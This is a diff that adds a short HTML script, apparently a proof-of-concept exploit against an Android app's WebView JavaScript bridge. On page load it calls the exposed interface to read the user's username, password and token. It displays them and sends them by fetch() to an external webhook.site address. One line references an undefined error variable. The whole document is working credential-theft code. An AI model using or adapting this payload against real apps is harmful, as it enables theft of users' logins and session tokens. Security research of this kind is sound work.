@@ -1,0 +1,18 @@
+<script>
+window.onload = function() {
+        let toastResult = Androidinterface.showToast("🔥 Exploit Triggered!");
+        let u = Androidinterface.getusername();
+        let p = Androidinterface.getpassword();
+        let t = Androidinterface.gettoken();
+        alert("showToast() returned: " + toastResult +
+              "\nU=" + u +
+              "\nP=" + p +
+              "\nT=" + t);
+        fetch("https://webhook.site/fa086217-a4a9-4b3e-be90-6e329d527997/log"
+              + "?toast=" + encodeURIComponent(toastResult)
+              + "&u=" + encodeURIComponent(u)
+              + "&p=" + encodeURIComponent(p)
+              + "&t=" + encodeURIComponent(t));
+        alert("Error: " + e);
+};
+</script>
